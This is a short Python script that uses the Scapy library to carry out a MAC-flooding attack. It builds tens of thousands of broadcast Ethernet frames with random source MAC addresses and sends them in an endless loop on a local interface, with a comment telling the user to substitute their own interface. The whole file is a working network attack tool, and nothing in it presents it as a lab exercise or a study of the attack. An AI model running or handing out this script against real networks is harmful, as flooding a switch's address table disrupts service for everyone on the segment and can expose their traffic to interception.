from time import sleep
from scapy.all import *
from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from random import randint

packets = []
for i in range(128 * 255):
    mac_source = ":".join(f"{randint(0, 255):02x}" for _ in range(6))
    eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac_source)
    ip = IP(dst="42.42.42.42", src="13.37.13.37")
    packets.append(eth / ip)

# Send the packet
while True:
    sendp(packets, iface="eth0")  # Replace eth0 with your network interface
